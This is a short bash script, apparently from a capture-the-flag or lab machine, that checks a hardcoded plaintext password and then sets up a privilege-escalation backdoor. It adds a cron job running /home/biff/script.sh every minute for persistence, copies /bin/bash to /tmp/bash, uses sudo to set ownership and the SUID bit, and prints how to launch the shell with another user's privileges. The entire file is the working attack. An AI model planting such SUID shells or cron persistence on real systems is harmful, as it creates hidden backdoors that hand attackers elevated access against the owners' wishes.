#!/bin/bash

# Here’s the password good job!
correct_password="T1meMach1ne88"

# Function to check if the last command succeeded
check_command_success() {
    if [ $? -ne 0 ]; then
        echo "Error: $1 failed. Exiting."
        exit 1
    fi
}

# Prompt the user for the password
echo -n "Enter password: "
read -s user_password

# Check if the password is correct
if [ "$user_password" == "$correct_password" ]; then
    echo -e "\nPassword correct."

    # Check if cron job exists for claire; if not, add it
    cron_exists=$(crontab -l 2>/dev/null | grep -c "/home/biff/script.sh")
    if [ "$cron_exists" -eq 0 ]; then
        (crontab -l 2>/dev/null; echo "* * * * * /home/biff/script.sh") | crontab -
        check_command_success "Adding cron job"
        echo "Cron job added for biff."
    fi

    # Remove existing /tmp/bash if it exists
    if [ -f /tmp/bash ]; then
        echo "Removing old /tmp/bash file..."
        rm -f /tmp/bash
        check_command_success "Removing /tmp/bash"
    fi

    # Copy /bin/bash to /tmp/bash
    echo "Copying /bin/bash to /tmp/bash..."
    cp /bin/bash /tmp/bash
    check_command_success "Copying /bin/bash to /tmp/bash"

    # Change ownership of /tmp/bash to biff (using restricted sudo)
    echo "Changing ownership of /tmp/bash to biff..."
    sudo /bin/chown biff:biff /tmp/bash
    check_command_success "Changing ownership of /tmp/bash"

    # Set SUID bit and permissions on /tmp/bash (using restricted sudo)
    echo "Setting SUID bit and permissions on /tmp/bash..."
    sudo /bin/chmod 4755 /tmp/bash
    check_command_success "Setting SUID bit and permissions on /tmp/bash"

    echo "SUID shell created at /tmp/bash. Run it with '/tmp/bash -p' to get claire's privileges."
else
    echo -e "\nIncorrect password. Access denied."
fi

